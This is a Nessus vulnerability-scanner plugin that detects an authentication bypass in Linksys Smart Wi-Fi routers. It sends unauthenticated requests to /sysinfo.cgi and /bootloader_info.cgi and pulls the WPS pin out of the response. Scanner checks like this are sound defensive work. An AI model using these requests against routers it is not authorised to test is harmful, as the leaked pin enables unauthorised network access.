#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(101813);
  script_version("1.5");
  script_cvs_date("Date: 2018/11/15 20:50:17");


  script_name(english:"Linksys Smart Wi-Fi Router CGI Scripts Information Disclosure");
  script_summary(english:"Attempts to get the WPS pin.");

  script_set_attribute(attribute:"synopsis", value:
"The remote device is affected by an information disclosure
vulnerability");
  script_set_attribute(attribute:"description", value:
"The remote Linksys Smart Wi-Fi Router device is affected by an
information disclosure vulnerability in its web administration
interface due to a flaw that allows bypassing authentication
mechanisms for various CGI scripts. An unauthenticated, remote
attacker can exploit this to disclose sensitive information related to
the device, such as WPS pin information.");
  # http://blog.ioactive.com/2017/04/linksys-smart-wi-fi-vulnerabilities.html
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?554068d3");
  script_set_attribute(attribute:"see_also", value:"https://www.linksys.com/us/support-article?articleNum=246427");
  script_set_attribute(attribute:"solution", value:
"Follow the vendor recommendation for upgrade or mitigation.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:F/RL:U/RC:X");

  script_set_attribute(attribute:"vuln_publication_date", value:"2017/04/20");
  script_set_attribute(attribute:"patch_publication_date", value:"2017/04/20");
  script_set_attribute(attribute:"plugin_publication_date", value:"2017/07/19");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"x-cpe:/a:linksys:linksyssmartwifi");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_GATHER_INFO);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2017-2018 Tenable Network Security, Inc.");

  script_dependencies("linksys_smart_wifi_www_detect.nbin");
  script_require_keys("installed_sw/Linksys Smart Wi-Fi WWW");
  script_require_ports("Services/www", 80, 443);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

function report_vuln(wps, uri, port)
{
  var report = 
    '\n' + "Nessus was able to determine the WPS pin for the remote host :" +
    '\n' +
    '\n' + "  URL     : " + build_url(port:port, qs:uri) + 
    '\n' + "  WPS Pin : " + wps + '\n';
  security_report_v4(severity:SECURITY_WARNING, port:port, extra:report);
  exit(0);
}

get_install_count(app_name:"Linksys Smart Wi-Fi WWW", exit_if_zero:TRUE);
port = get_http_port(default:80, embedded:TRUE);
install = get_single_install(app_name:"Linksys Smart Wi-Fi WWW", port:port);

# The original info leak is that sysinfo.cgi is available and this allows
# a caller to see all sorts of stuff (running procs, dmesg, /var/log/messages,
# WPS pin, default wifi password, etc.). On some versions it looks like
# basic auth was applied to sysinfo.cgi but you can still get some useful
# info from bootloader_info.cgi. The final solution applies basic auth to
# all cgi in the base directory.

# try sysinfo first
uri = '/sysinfo.cgi';
res = http_send_recv3(method:'GET', item:uri, port:port);
if ("200 OK" >< res[0] && !isnull(res[2]) && len(res[2]) > 0)
{
  match = pregmatch(string:res[2], pattern:"wps_device_pin=([0-9]+)");
  if (!isnull(match))
  {
    report_vuln(wps:match[1], uri:uri, port:port);
  }
}

# try bootloader_info.cgi seconds
uri = '/bootloader_info.cgi';
res = http_send_recv3(method:'GET', item:uri, port:port);
if ("200 OK" >< res[0] && !isnull(res[2]) && len(res[2]) > 0)
{
  match = pregmatch(string:res[2], pattern:"wps_device_pin=([0-9]+)");
  if (!isnull(match))
  {
    report_vuln(wps:match[1], uri:uri, port:port);
  }
}

audit(AUDIT_HOST_NOT, "an affected Linksys Smart Wi-Fi device");
